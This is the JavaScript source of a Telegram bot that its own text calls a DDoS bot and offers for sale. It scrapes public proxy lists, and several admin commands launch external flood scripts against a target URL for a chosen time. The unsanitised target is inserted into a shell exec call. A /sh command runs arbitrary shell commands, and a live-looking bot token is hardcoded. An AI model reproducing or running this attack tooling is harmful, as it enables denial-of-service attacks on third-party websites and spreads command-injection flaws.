const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const CFonts = require('cfonts');
const figlet = require("figlet")
const token = '7287508845:AAHbtYXgUYyDLBB7meaYaPfjJVgG7bVD4TY';
const bot = new TelegramBot(token, {polling: true});
const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
const adminIds = adminData.admins;
const timeLimit = parseInt(adminData.limit,999999);

console.log(figlet.textSync('BIMZ', {
    font: 'Standard',
    horizontalLayout: 'default',
    vertivalLayout: 'default',
    whitespaceBreak: false
  }))
  
    bot.on('message', (msg) => {
        const nama = msg.from?.first_name || msg.from?.username || 'Anonymous'; // Improved name handling
        const username = msg.from?.username || 'Anonymous'; 
        const userId = msg.from?.id || 'Unknown ID'; // Handle cases where ID might not be available
        const message = msg.text || msg.caption || 'Media atau pesan lain'; // Include caption for media messages

        console.log(`\x1b[97m──⟨ \x1b[42m\x1b[97m[ @${nama} ]\x1b[50m[ @${username} ]\x1b[44m\x1b[35m[ ${userId} ]\x1b[0m`);
        console.log(`\x1b[31mPesan: \x1b[0m${message}\x1b[0m\n`);
    });

let processes = {};
const stopProcesses = (chatId) => {
  if (processes[chatId]) {
    processes[chatId].forEach(proc => proc.kill());
    processes[chatId] = [];
    bot.sendMessage(chatId, 'Proses berhasil dihentikan.');
  } else {
    bot.sendMessage(chatId, 'Tidak ada proses yang berjalan.');
  }
};
const urls = [
  'https://sunny9577.github.io/proxy-scraper/proxies.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=anonymous',
  'https://sunny9577.github.io/proxy-scraper/generated/http_proxies.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt',
  'https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt',
  'https://www.proxy-list.download/api/v1/get?type=http',
  'https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt',
  'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=5000&country=all&ssl=all&anonymity=all',
  'https://sunny9577.github.io/proxy-scraper/generated/socks4_proxies.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt',
  'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt',
  'https://www.proxy-list.download/api/v1/get?type=socks4',
  'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all&ssl=all&anonymity=all',
  'https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt',
  'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt',
  'https://www.proxy-list.download/api/v1/get?type=socks5',
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/. proxy_files/http_proxies.txt',
  'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
  'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
  'https://api.openproxylist.xyz/http.txt',
  'https://api.proxyscrape.com/v2/?request=displayproxies',
  'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
  'https://www.proxydocker.com/en/proxylist/download?email=noshare&country=all&city=all&port=all&type=all&anonymity=all&state=all&need=all',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
  'http://worm.rip/http.txt',
  'https://proxyspace.pro/http.txt',
  'https://multiproxy.org/txt_all/proxy.txt',
  'https://proxy-spider.com/api/proxies.example.txt',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=100',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=110',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=96',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=88',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=5',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=6',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=7',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=8',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=9',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=10',
  'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
  'https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
];

async function scrapeProxies(chatId) {
  let proxies = [];
  const totalUrls = urls.length;
  let progressMessage = await bot.sendMessage(chatId, 'Memulai Scraper\n{ 0% }');

  for (let i = 0; i < totalUrls; i++) {
    try {
      const { data } = await axios.get(urls[i]);
      const $ = cheerio.load(data);

      $('tr').each((j, elem) => {
        const ip = $(elem).find('td').eq(0).text().trim();
        const port = $(elem).find('td').eq(1).text().trim();
        if (ip && port) {
          proxies.push(`${ip}:${port}`);
        }
      });
    } catch (error) {
      console.error(`Error scraping ${urls[i]}:`, error);
    }
    const progress = Math.round(((i + 1) / totalUrls) * 100);
    await bot.editMessageText(`Memulai Scraper\n{ ${progress}% }`, {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });
  }
  fs.writeFileSync('proxy.txt', proxies.join('\n'), 'utf8');
  await bot.editMessageText('Proxy Berhasil Di Update', {
    chat_id: chatId,
    message_id: progressMessage.message_id
  });

  console.log(`Scraped ${proxies.length} proxies and saved to proxy.txt`);
}

bot.onText(/\/start/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`Hallo ${name}, Selamat Datang Di Bot DDoS BIMZ
  
Nama Bot : BIMZ
Developer : BIMZ
Version : 0.1
  
── 𖥔DDoS Menu
/tls [ Url ] [ Time ]

  
── 𖥔Info Web
/info [ Url ]

── 𖥔Proxy Scraper
/proxyupdate

── 𖥔Buy Script
/script

── 𖥔Cek Status Bot
/cekbot

── 𖥔Cek IP Address
/cekip [ IP ]

── 𖥔Tinyurl Web
/tinyurl [ Url ]

── 𖥔Owner
/owner
  
Bot DDoS Simple By BIMZ
  `);
});

bot.onText(/^\/StarsXHttps(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node StarsXHttps.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By SkyranXMods\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nDDoS By SkyranXMods`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Rann(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Rann.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By SkyranXMods\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nDDoS By SkyranXMods`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tenzu(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node tenzu.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By SkyranXMods\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nDDoS By SkyranXMods`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tlsvip(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Tlsvip.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By SkyranXMods\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nDDoS By SkyranXMods`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tls(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node Tls.js ${target} ${time} 100 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By BIMZ\nTarget: ${target}\nTime: ${time}\nRate: 100\nThread: 10\nDDoS By BIMZ`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/StarsXMix(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node StarsXMix.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By SkyranXMods\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nDDoS By SkyranXMods`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypass(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node bypass.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By SkyranXMods\nTarget: ${target}\nTime: ${time}\nRate: 35\nThread: 10\nDDoS By SkyranXMods`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;

  if (callbackQuery.data === 'stop') {
    const isAdmin = adminIds.includes(chatId.toString());

    if (!isAdmin) {
      bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menghentikan perintah ini.');
      return;
    }
    stopProcesses(chatId);
  }
});
bot.onText(/^\/upproxy$/, async (msg) => {
  const chatId = msg.chat.id;
  const isAdmin = adminIds.includes(chatId.toString());
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  try {
    if (fs.existsSync('proxy.txt')) {
      fs.unlinkSync('proxy.txt');
    }
    await scrapeProxies(chatId);
  } catch (error) {
    bot.sendMessage(chatId, `Terjadi kesalahan saat memperbarui proxy: ${error.message}`);
  }
});


bot.onText(/\/sh (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const command = match[1];
  const isAdmin = adminIds.includes(chatId.toString());
  
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  
  exec(command, { maxBuffer: parseInt(adminData.limit) * 1024 }, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Stderr: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Output:\n${stdout}`);
  });
});

bot.onText(/^\/info (.+)/, (msg, match) => {
 const chatId = msg.chat.id;
 const web = match[1];
 const data = {
     target: web,
     apikey: 'NOKEY'
 };
 axios.post('https://check-host.cc/rest/V2/info', data, {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
   }
 })
 .then(response => {
     const result = response.data;
     if (result.status === 'success') {
         const info = `
          
\`\`\`INFORMASI-WEB+${web}
IP:        ${result.ip}
Hostname:  ${result.hostname}
ISP:       ${result.isp}
ASN:       ${result.asn}
ORG:       ${result.org}
Country:   ${result.country}
Region:    ${result.region}
City:      ${result.city}
Timezone:  ${result.timezone}
Latitude: ${result.latitude}
Longitude: ${result.longitude}
\`\`\`
*About ASN:* \`${result.asnlink}\`
*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
         `;
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } else {
         bot.sendMessage(chatId, 'Gagal mendapatkan informasi. Coba lagi nanti.');
     }
 })
 .catch(error => {
     console.error(error);
     bot.sendMessage(chatId, 'Terjadi kesalahan saat menghubungi API.');
 });
});
bot.onText(/\/script/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Mau Beli Script Bot DDoS?\nKlik Button Di Bawah Untuk Menghubungi Developer Bot\n\nNote : Jangan Spamm!!",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Buy Script', url: `http://t.me/Wh000pz` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/\/cekbot/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, "Haii Kak, Bot Online ( Aktif ), Jika Bot Off Mungkin Sedang Maintenance Atau Hubungi Owner Kami Makasih⬇️",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'BIMZ', url: `http://t.me/Wh000pz` }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

bot.onText(/^(\.|\#|\/)cekip(?: (.+))?$/, async (msg, match) => {
        const chatId = msg.chat.id;
        const ip = match[2];
        if (!ip) {
            bot.sendMessage(chatId, 'Input Link! Example /cekip ip nya ', { reply_to_message_id: msg.message_id });
            return;
        }

        try {
            const response = await axios.get(`https://apikey-premium.000webhostapp.com/loc/?IP=${ip}`);
            
            const data = response.data;
            bot.sendChatAction(chatId, 'typing');
            
            // Kirim informasi ke pengguna
            const message = `
🌐 Creator : BIMZ
🔍 IP : ${data.query}
📊 Status : ${data.status}
🌍 Country : ${data.country}
🗺️ Country Code : ${data.countryCode}
🏞️ Region : ${data.region}
🏡 Region Name : ${data.regionName}
🏙️ City : ${data.city}
🏘️ District : ${data.district}
🏠 Zip : ${data.zip}
🌍 Latitude : ${data.lat}
🌍 Longitude : ${data.lon}
⏰ Timezone : ${data.timezone}
📶 ISP : ${data.isp}
🏢 Organization : ${data.org}
🌐 AS : ${data.as}
            `;
            
            bot.sendMessage(chatId, message);

            // Kirim lokasi ke pengguna
            bot.sendLocation(chatId, data.lat, data.lon);
        } catch (error) {
            console.error('Error:', error);
            // Kirim pesan error jika terjadi kesalahan
            bot.sendMessage(chatId, 'Terjadi kesalahan dalam memproses permintaan.');
        }
    });
    
bot.onText(/^(\.|\#|\/)tinyurl(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[2];
  if (!url) {
      bot.sendMessage(chatId, 'Usage: /tinyulr [web]\nExample: /tinyulr https://web.com', { reply_to_message_id: msg.message_id });
       return;
    }
            
  // Pastikan URL dimulai dengan "http://" atau "https://"
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    bot.sendMessage(chatId, 'URL harus dimulai dengan "http://" atau "https://"');
    return;
  }

  try {
    const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
    const shortenedUrl = response.data;
    bot.sendChatAction(chatId, 'typing');
    bot.sendMessage(chatId, shortenedUrl);
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, 'Maaf, terjadi kesalahan saat mempersingkat URL.');
  }
});

bot.onText(/\/owner/, (msg) => {
      const chatId = msg.chat.id;
      const name = msg.from.first_name;
      const buttons = [
        {
          text: 'Instagram',
          url: 'https://instagram.com/BIMZ'
        },
        {
          text: 'Telegram',
          url: 'https://t.me/Wh000pz'
        },
        {
          text: 'YouTube',
          url: 'https://www.youtube.com/@BIMZ_ESCOBAR'
        }
      ];
      bot.sendMessage(chatId, `Halo kak ${name}, kamu bisa terhubung dengan owner BIMZ melalui link di bawah:`, {
        reply_markup: {
          inline_keyboard: [buttons]
        }
      });
    });
bot.on('polling_error', (error) => console.log(error));


